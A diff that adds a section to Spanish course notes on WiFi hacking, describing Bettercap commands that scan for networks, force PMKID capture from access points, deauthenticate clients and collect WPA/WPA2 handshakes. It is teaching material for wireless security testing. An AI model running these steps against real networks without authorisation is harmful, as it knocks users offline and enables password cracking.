@@ -1925,3 +1925,49 @@ Este video presenta cómo obtener el handshake de una red WPA/WPA2 **sin necesid
 ### Aplicabilidad y versiones:
 - **WPA/WPA2**: Funciona en redes WPA y WPA2 que sean vulnerables. No es un fallo del protocolo en sí, sino de implementaciones específicas.
 - **WPA3**: No es aplicable. WPA3 tiene protecciones específicas contra este tipo de ataques.
+
+
+## 52. Ataque desde Bettercap
+
+Este video muestra cómo utilizar Bettercap para realizar la captura de PMKID sin clientes conectados.
+
+### Procedimiento del video:
+
+1. **Iniciar Bettercap**:
+   ```bash
+   sudo bettercap -iface <interfaz_wifi>
+   ```
+
+2. **Activar el módulo de reconocimiento WiFi**:
+   ```
+   wifi.recon on
+   ```
+   - Este comando inicia el escaneo de redes WiFi cercanas.
+
+3. **Visualizar las redes detectadas**:
+   ```
+   wifi.show
+   ```
+   - Muestra todas las redes WiFi detectadas con detalles como BSSID, ESSID, canal, etc.
+
+4. **Iniciar el ataque PMKID**:
+   ```
+   wifi.assoc all
+   ```
+   o específicamente:
+   ```
+   wifi.assoc <BSSID>
+   ```
+   - Este comando intenta asociarse con los puntos de acceso para provocar que envíen el PMKID.
+
+5. **Capturar handshakes**:
+   ```
+   wifi.deauth <BSSID>
+   ```
+   - Para redes con clientes, este comando desautentica a los clientes para capturar el handshake.
+
+6. **Exportar los handshakes capturados**:
+   ```
+   wifi.handshakes
+   ```
+   - Muestra los handshakes capturados.
